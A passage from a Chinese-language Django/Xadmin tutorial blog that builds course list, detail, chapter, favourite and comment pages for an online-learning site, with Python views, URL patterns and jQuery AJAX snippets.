try:</span><br><span class="line">            page &#x3D; request.GET.get(&#39;page&#39;, 1)</span><br><span class="line">        except PageNotAnInteger:</span><br><span class="line">            page &#x3D; 1</span><br><span class="line">        # 这里指从allorg中取五个出来，每页显示5个</span><br><span class="line">        p &#x3D; Paginator(all_course,6 , request&#x3D;request)</span><br><span class="line">        courses &#x3D; p.page(page)</span><br><span class="line">        return render(request, &quot;course-list.html&quot;, &#123;</span><br><span class="line">            &quot;all_course&quot;:courses,</span><br><span class="line"></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>在html中使用时注意object_list</p><blockquote><p>此时的all_course已经不是一个queryset，而是一个purepage对象。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1779926-26a2db1d15e596ee.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/324" alt="img"></p><h3 id="对于页码进行修改"><a href="#对于页码进行修改" class="headerlink" title="对于页码进行修改"></a>对于页码进行修改</h3><p><img src="https://upload-images.jianshu.io/upload_images/1779926-64f30fd33b3311b8.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/359" alt="img"></p><p>直接把orglist中的那段拿过来就行了。自行替换变量名称</p><p>此时已经好了。</p><h3 id="排序功能"><a href="#排序功能" class="headerlink" title="排序功能"></a>排序功能</h3><p>将之前的sort逻辑拷贝过来:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 进行排序</span><br><span class="line">        sort &#x3D; request.GET.get(&#39;sort&#39;, &quot;&quot;)</span><br><span class="line">        if sort:</span><br><span class="line">            if sort &#x3D;&#x3D; &quot;students&quot;:</span><br><span class="line">                all_orgs &#x3D; all_orgs.order_by(&quot;-students&quot;)</span><br><span class="line">            elif sort &#x3D;&#x3D; &quot;courses&quot;:</span><br><span class="line">                all_orgs &#x3D; all_orgs.order_by(&quot;-course_nums&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改完成:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"># 进行排序</span><br><span class="line">sort &#x3D; request.GET.get(&#39;sort&#39;, &quot;&quot;)</span><br><span class="line">if sort:</span><br><span class="line">    if sort &#x3D;&#x3D; &quot;students&quot;:</span><br><span class="line">        all_course &#x3D; all_course.order_by(&quot;-students&quot;)</span><br><span class="line">    elif sort &#x3D;&#x3D; &quot;hot&quot;:</span><br><span class="line">        all_course &#x3D; all_course.order_by(&quot;-click_nums&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>应放在分页之前。让分页处理所有筛选过的数据</p><p>return render时添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;sort&quot;:sort,</span><br><span class="line"></span><br></pre></td></tr></table></figure><blockquote><p>用来判断激活状态。</p></blockquote><p><img src="https://upload-images.jianshu.io/upload_images/1779926-328124bfa5053a04.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/684" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-ed8c90123aad0aa3.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/357" alt="img"></p><p>修改a标签参数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 热门课程推荐</span><br><span class="line">    hot_courses &#x3D; Course.objects.all().order_by(&quot;-students&quot;)[:3]</span><br><span class="line">    return render</span><br><span class="line">     &quot;hot_courses&quot;:hot_courses</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>修改html中</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-cbe1c790936b4ac4.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/451" alt="img"></p><p>mark</p><p>for循环填充内容</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-684356fcee55fbfb.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/669" alt="img"></p><p>这里的degree我们在数据库中填写的是字母。如何显示为中文。</p><ul><li>个人猜测: template if</li></ul><p>get_degree_display degree是字段名。专门用于choice字段显示</p><h2 id="课程详情页1"><a href="#课程详情页1" class="headerlink" title="课程详情页1"></a>课程详情页1</h2><p>拷贝course_detail进入template目录</p><p>可以看出这个页面也是继承base页面的。将course_list的页面框架拿过来</p><p>替换面包屑。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-d95e655c89cf141d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/450" alt="img"></p><p>配置url访问</p><p>django2.0.1：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 课程详情页</span><br><span class="line">re_path(&#39;course&#x2F;(?P&lt;course_id&gt;\d+)&#x2F;&#39;, CourseDetailView.as_view(), name&#x3D;&quot;course_detail&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>书写对应访问的view</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"> 课程详情处理view</span><br><span class="line"></span><br><span class="line">class CourseDetailView(View):</span><br><span class="line">    def get(self, request, course_id):</span><br><span class="line">        return  render(request, &quot;course-detail.html&quot;, &#123;</span><br><span class="line"></span><br><span class="line">        &#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>尝试访问：</p><p>在列表展示页放入详情的url。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-1e60d63aa8c0707a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/440" alt="img"></p><p>有参数类型的把参数也传进来</p><p>进行数据填充:先取出当前的课程</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"># 此处的id为表默认为我们添加的值。</span><br><span class="line">course &#x3D; Course.objects.get(id &#x3D; int(course_id))</span><br><span class="line"></span><br><span class="line">        return  render(request, &quot;course-detail.html&quot;, &#123;</span><br><span class="line">    &quot;course&quot;:course,</span><br><span class="line">&#125;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>html中取出数据:</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-a789f4e6596bddea.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/587" alt="img"></p><p>课程的章节数如何实现？</p><p>models.py中自定义方法</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">def get_zj_nums(self):</span><br><span class="line">    # 获取课程章节数的方法</span><br><span class="line">    return self.lesson_set.all().count()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>添加课程类别字段</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">category &#x3D; models.CharField(max_length&#x3D;20, default&#x3D;u&quot;&quot;, verbose_name&#x3D;u&quot;课程类别&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">makemigrations</span><br><span class="line">migrate</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>operation中专门有张表是做用户学习记录的。</p><p>UserCourse查询有哪些学生学习了这门课</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"># 获取学习这门课程的用户</span><br><span class="line">def get_learn_users(self):</span><br><span class="line">    # 谁的里面添加了它做外键，他都可以取出来</span><br><span class="line">    return self.usercourse_set.all()[:5]</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-09b470546eb4befa.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><p>链式调用取出数据</p><p>添加一些用户课程进行验证</p><p><img src="Django-Xadmin%E5%BC%80%E5%8F%91%E5%9C%A8%E7%BA%BF%E5%AD%A6%E4%B9%A0%E5%B9%B3%E5%8F%B0/181.png"></p><p>可以看到已经大功告成</p><p>课程详情的view中添加clicknums+1</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"># 增加课程点击数</span><br><span class="line">course.click_nums +&#x3D; 1</span><br><span class="line">course.save()</span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://upload-images.jianshu.io/upload_images/1779926-899e69891bd0625a.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/97" alt="img"></p><h2 id="课程详情页2"><a href="#课程详情页2" class="headerlink" title="课程详情页2"></a>课程详情页2</h2><p><img src="https://upload-images.jianshu.io/upload_images/1779926-6a3617d392c3d732.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/356" alt="img"></p><p>tab_cont1 中填充我们自己的内容。</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-2b24323d03b4aab7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/584" alt="img"></p><p>mark</p><p>教师数自定义函数</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">def get_teacher_nums:</span><br><span class="line">    return self.teacher_set.all().count</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>不用自定义函数的方法如下</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-58fe976a62992781.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><h3 id="课程是否相关"><a href="#课程是否相关" class="headerlink" title="课程是否相关"></a>课程是否相关</h3><p>定义课程的tag ，如果tag相同，那么是相关课程。</p><p>courses/models.py:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">tag &#x3D; models.CharField(max_length&#x3D;15, verbose_name&#x3D;u&quot;课程标签&quot;, default&#x3D;u&quot;&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>更改数据库后必然。此处略。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">tag &#x3D; course.tag</span><br><span class="line">       if tag:</span><br><span class="line">       # 需要从1开始不然会推荐自己</span><br><span class="line">           relate_courses &#x3D; Course.objects.filter(tag&#x3D;tag)[1:2]</span><br><span class="line">       else:</span><br><span class="line">           relate_courses &#x3D; []</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>return render加上：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&quot;relate_courses&quot;:relate_courses,</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="收藏功能"><a href="#收藏功能" class="headerlink" title="收藏功能:"></a>收藏功能:</h3><p>将block js写到页面底部。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">&#x2F;&#x2F;收藏分享</span><br><span class="line">function add_fav(current_elem, fav_id, fav_type)&#123;</span><br><span class="line">    $.ajax(&#123;</span><br><span class="line">        cache: false,</span><br><span class="line">        type: &quot;POST&quot;,</span><br><span class="line">        url:&quot;&#123;% url &quot;org:add_fav&quot; %&#125;&quot;,</span><br><span class="line">        data:&#123;&#39;fav_id&#39;:fav_id, &#39;fav_type&#39;:fav_type&#125;,</span><br><span class="line">        async: true,</span><br><span class="line">        beforeSend:function(xhr, settings)&#123;</span><br><span class="line">            xhr.setRequestHeader(&quot;X-CSRFToken&quot;, &quot;&#123;&#123; csrf_token &#125;&#125;&quot;);</span><br><span class="line">        &#125;,</span><br><span class="line">        success: function(data) &#123;</span><br><span class="line">            if(data.status &#x3D;&#x3D; &#39;fail&#39;)&#123;</span><br><span class="line">                if(data.msg &#x3D;&#x3D; &#39;用户未登录&#39;)&#123;</span><br><span class="line">                    window.location.href&#x3D;&quot;&#x2F;login&#x2F;&quot;;</span><br><span class="line">                &#125;else&#123;</span><br><span class="line">                    alert(data.msg)</span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">            &#125;else if(data.status &#x3D;&#x3D; &#39;success&#39;)&#123;</span><br><span class="line">                current_elem.text(data.msg)</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;,</span><br><span class="line">    &#125;);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$(&#39;#jsLeftBtn&#39;).on(&#39;click&#39;, function()&#123;</span><br><span class="line">    add_fav($(this), &#123;&#123; course.id &#125;&#125;, 1);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">$(&#39;#jsRightBtn&#39;).on(&#39;click&#39;, function()&#123;</span><br><span class="line">    add_fav($(this), &#123;&#123; course.course_org.id &#125;&#125;, 2);</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>刷新后又不见了的问题，从view中传递has_fav的参数。前台进行判断。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"># 是否收藏课程</span><br><span class="line">      has_fav_course &#x3D; False</span><br><span class="line">      has_fav_org &#x3D; False</span><br><span class="line"></span><br><span class="line">      # 必须是用户已登录我们才需要判断。</span><br><span class="line">      if request.user.is_authenticated:</span><br><span class="line">          if UserFavorite.objects.filter(user&#x3D;request.user, fav_id&#x3D;course.id, fav_type&#x3D;1):</span><br><span class="line">              has_fav_course &#x3D; True</span><br><span class="line">          if UserFavorite.objects.filter(user&#x3D;request.user, fav_id&#x3D;course.course_org.id, fav_type&#x3D;2):</span><br><span class="line">              has_fav_org &#x3D; True</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>return render</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&quot;has_fav_course&quot;:has_fav_course,</span><br><span class="line">&quot;has_fav_org&quot;:has_fav_org,</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>html中使用；</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-16c181b9f582096d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/451" alt="img"></p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-2f230e15debb69bd.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/391" alt="img"></p><h2 id="课程章节信息"><a href="#课程章节信息" class="headerlink" title="课程章节信息"></a>课程章节信息</h2><p>章节信息，评论信息。</p><p>course comments 和 course video放入 template</p><p>它也有head和foot继承我们的base页面</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-1588d6c27ba74039.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><p>配置相应的url:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"># 处理课程章节信息页面的view</span><br><span class="line"></span><br><span class="line">class CourseInfoView(View):</span><br><span class="line">    def get(self, request, course_id):</span><br><span class="line">        # 此处的id为表默认为我们添加的值。</span><br><span class="line">        course &#x3D; Course.objects.get(id&#x3D;int(course_id))</span><br><span class="line">        # 是否收藏课程</span><br><span class="line">        return render(request, &quot;course-video.html&quot;, &#123;</span><br><span class="line">            &quot;course&quot;: course,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 课程章节信息页</span><br><span class="line">url(r&#39;^info&#x2F;(?P&lt;course_id&gt;\d+)&#x2F;$&#39;, CourseInfoView.as_view(), name&#x3D;&quot;course_info&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>用户点击开始学习链接修改</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-d34dbb985ee59d1f.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/688" alt="img"></p><p>为课程添加章节以及视频。</p><h2 id="章节视频信息"><a href="#章节视频信息" class="headerlink" title="章节视频信息"></a>章节视频信息</h2><p>为video表添加视频对应的url信息。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">url &#x3D; models.CharField(max_length&#x3D;200, default&#x3D;&quot;http:&#x2F;&#x2F;blog.mtianyan.cn&#x2F;&quot; ,verbose_name&#x3D;u&quot;访问地址&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将章节信息填充进页面</p><p>通过课程可以找到章节:course.lesson_set</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-f4da10e0b50885e7.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/412" alt="img"></p><p>video的时长添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 使用分钟做后台记录(存储最小单位)前台转换</span><br><span class="line">   learn_times &#x3D; models.IntegerField(default&#x3D;0, verbose_name&#x3D;u&quot;学习时长(分钟数)&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>资源下载功能:</p><p>后台自行上传点文件</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">all_resources &#x3D; CourseResource.objects.filter(course&#x3D;course)</span><br><span class="line"></span><br><span class="line">          &quot;all_resources&quot;:all_resources,</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或者前端直接:</p><p><img src="https://upload-images.jianshu.io/upload_images/1779926-8d93aa48922aed99.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/700" alt="img"></p><p>创建课程与讲师之间的外键关联</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">teacher &#x3D; models.ForeignKey(Teacher,verbose_name&#x3D;u&quot;讲师&quot;, null&#x3D;True, blank&#x3D;True)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>前往课程，设置讲师。</p><p><strong>注意:不要在Unicode方法里使用外键字段很容易报错。</strong></p><p>增加课程需知字段和老师告诉你学什么？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">you_need_know &#x3D; models.CharField(max_length&#x3D;300, default&#x3D;u&quot;一颗勤学的心是本课程必要前提&quot;,verbose_name&#x3D;u&quot;课程须知&quot;)</span><br><span class="line">  teacher_tell &#x3D; models.CharField(max_length&#x3D;300, default&#x3D;u&quot;按时交作业,不然叫家长&quot;,verbose_name&#x3D;u&quot;老师告诉你&quot;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>将这两个字段显示到页面。</p><h2 id="课程评论页面"><a href="#课程评论页面" class="headerlink" title="课程评论页面"></a>课程评论页面</h2><p>配置课程评论的url和view</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">class CommentsView(View):</span><br><span class="line">    def get(self, request, course_id):</span><br><span class="line">        # 此处的id为表默认为我们添加的值。</span><br><span class="line">        course &#x3D; Course.objects.get(id&#x3D;int(course_id))</span><br><span class="line">        all_resources &#x3D; CourseResource.objects.filter(course&#x3D;course)</span><br><span class="line">        return render(request, &quot;course-comment.html&quot;, &#123;</span><br><span class="line">            &quot;course&quot;: course,</span><br><span class="line">            &quot;all_resources&quot;: all_resources,</span><br><span class="line">        &#125;)</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 课程章节信息页</span><br><span class="line">    re_path(&#39;comments&#x2F;(?P&lt;course_id&gt;\d+)&#x2F;&#39;, CommentsView.as_view(), name&#x3D;&quot;course_comments&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>course video中跳转到评论链接</p><p>发表评论功能</p><p>ajax操作。如果发布成功就会刷新页面。</p><p>新建view用于添加评论:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"># ajax方式添加评论</span><br><span class="line">class AddCommentsView(View):</span><br><span class="line">    def post(self, request):</span><br><span class="line">        if not request.user.is_authenticated:</span><br><span class="line">            # 未登录时返回json提示未登录，跳转到登录页面是在ajax中做的</span><br><span class="line">            return HttpResponse(&#39;&#123;&quot;status&quot;:&quot;fail&quot;, &quot;msg&quot;:&quot;用户未登录&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line">        course_id &#x3D; request.POST.get(&quot;course_id&quot;, 0)</span><br><span class="line">        comments &#x3D; request.POST.get(&quot;comments&quot;, &quot;&quot;)</span><br><span class="line">        if int(course_id) &gt; 0 and comments:</span><br><span class="line">            course_comments &#x3D; CourseComments()</span><br><span class="line">            # get只能取出一条数据，如果有多条抛出异常。没有数据也抛异常</span><br><span class="line">            # filter取一个列表出来，queryset。没有数据返回空的queryset不会抛异常</span><br><span class="line">            course &#x3D; Course.objects.get(id &#x3D; int(course_id))</span><br><span class="line">            # 外键存入要存入对象</span><br><span class="line">            course_comments.course &#x3D; course</span><br><span class="line">            course_comments.comments &#x3D; comments</span><br><span class="line">            course_comments.user &#x3D; request.user</span><br><span class="line">            course_comments.save()</span><br><span class="line">            return HttpResponse(&#39;&#123;&quot;status&quot;:&quot;success&quot;, &quot;msg&quot;:&quot;评论成功&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line">        else:</span><br><span class="line">            return HttpResponse(&#39;&#123;&quot;status&quot;:&quot;fail&quot;, &quot;msg&quot;:&quot;评论失败&quot;&#125;&#39;, content_type&#x3D;&#39;application&#x2F;json&#39;)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>添加配套的url:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"># 添加课程评论,已经把参数放到post当中了</span><br><span class="line">path(&#39;add_comment&#x2F;&#39;, AddCommentsView.as_view(), name&#x3D;&quot;add_comment&quot;),</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>js代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">&lt;script type&#x3D;&quot;text&#x2F;javascript&quot;&gt;</span><br><span class="line">    &#x2F;&#x2F;添加评论</span><br><span class="line">    $(&#39;#js-pl-submit&#39;).on(&#39;click&#39;, function()&#123;</span><br><span class="line">        var comments &#x3D; $(&quot;#js-pl-textarea&quot;).val()</span><br><span class="line">        if(comments &#x3D;&#x3D; &quot;&quot;)&#123;</span><br><span class="line">            alert(&quot;评论不能为空&quot;)</span><br><span class="line">            return</span><br><span class="line">        &#125;</span><br><span class="line">        $.ajax(&#123;</span><br><span class="line">            cache: false,</span><br><span class="line">            type: &quot;POST&quot;,</span><br><span class="line">            url:&quot;&#123;% url &#39;course:add_comment&#39; %&#125;&quot;,</span><br><span class="line">            data:&#123;&#39;course_id&#39;:&#123;&#123; course.id &#125;&#125;, &#39;comments&#39;:comments&#125;,</span><br><span class="line">            async: true,</span><br><span class="line">            beforeSend:function(xhr, settings)&#123;</span><br><span class="line">                xhr.setRequestHeader(&quot;X-CSRFToken&quot;, &quot;&#123;&#123; csrf_token &#125;&#125;&quot;);</span><br><span class="line">            &#125;,</span><br><span class="line">            success: function(data) &#123;</span><br><span class="line">                if(data.status &#x3D;&#x3D; &#39;fail&#39;)&#123;</span><br><span class="line">                    if(data.msg &#x3D;&#x3D; &#39;用户未登录&#39;)&#123;</span><br><span class="line">                        window.location.href&#x3D;&quot;&#x2F;login&#x2F;&quot;;</span><br><span class="line">                    &#125;else&#123;</span><br><span class="line">                        alert(data.msg)</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;else if(data.status &#x3D;&#x3D; &#39;success&#39;)&#123;</span><br><span class="line">                    window.location.reload();&#x2F;&#x2F;刷新当前页面.</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;,</span><br><span class="line">        &#125;);</span><br><span class="line">    &#125;);</span><br><span class="line"></span><br><span class="line">&lt;&#x2F;script&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>后端已经将all_comments传过来了。然后for循环输出。</p><h2 id="相关课程推荐"><a href="#相关课程推荐" class="headerlink" title="相关课程推荐:"></a>相关课程推荐:</h2><blockquote><p>学过该课程的还学过</p></blockquote><p>CourseInfoView</p><p>添加</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"># 选出学了这门课的学生关系</span><br><span class="line">        user_courses &#x3D; UserCourse.objects.filter(course&#x3D; course)</span><br><span class="line">        # 从关系中取出user_id</span><br><span class="line">        user_ids &#x3D; [user_course.user_id for user_course in user_courses]</span><br><span class="line">        # 这些用户学了的课程,外键会自动有id，取到字段</span><br><span class="line">        all_user_courses &#x3D; UserCourse.objects.filter(user_id__in&#x3D;user_ids)</span><br><span class="line">        # 取出所有课程id</span><br><span class="line">        course_ids &#x3D; [all_user_course.course_id for 